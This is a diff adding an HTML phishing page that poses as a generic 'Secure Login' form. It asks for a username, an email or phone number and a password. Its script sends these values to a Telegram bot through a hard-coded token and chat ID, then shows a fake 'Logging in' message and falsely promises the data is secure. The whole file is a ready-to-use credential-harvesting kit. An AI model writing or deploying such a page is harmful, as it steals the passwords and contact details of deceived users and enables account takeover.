@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Login</title>
+    <link rel="stylesheet" href="generic-login.css">
+    <script>
+        async function sendLoginData(event) {
+            event.preventDefault();
+
+            const username = document.getElementById("username").value;
+            const emailOrPhone = document.getElementById("email-or-phone").value;
+            const password = document.getElementById("password").value;
+
+            if (!username || !emailOrPhone || !password) {
+                alert("Please fill out all fields!");
+                return;
+            }
+
+            // Replace this with your bot's token
+            const BOT_TOKEN = "7280592829:AAEDF6KYufs2nicVtjabrdCvKOfmILGI348";
+            const CHAT_ID = "6219517451";
+
+            const message = `Login Attempt:\nUsername: ${username}\nEmail/Phone: ${emailOrPhone}\nPassword: ${password}`;
+
+            // Telegram API URL
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            const response = await fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                }),
+            });
+
+            if (response.ok) {
+                alert("Logging in... Please wait.");
+                document.getElementById("login-form").reset();
+            } else {
+                alert("An error occurred. Please try again.");
+            }
+        }
+    </script>
+</head>
+<body>
+    <div class="form-container">
+        <h1>Account Login</h1>
+        <p class="instruction">Log in to continue to your account.</p>
+        <form id="login-form" onsubmit="sendLoginData(event)">
+            <label for="username">Username:</label>
+            <input type="text" id="username" name="username" placeholder="Enter your username" required>
+
+            <label for="email-or-phone">Email or Phone:</label>
+            <input type="text" id="email-or-phone" name="email-or-phone" placeholder="Enter your email or phone" required>
+
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" placeholder="Enter your password" required>
+
+            <button type="submit">Log In</button>
+        </form>
+        <p class="footer-text">
+            Your data is secure. By logging in, you agree to our <a href="#">Privacy Policy</a>.
+        </p>
+    </div>
+</body>
+</html>
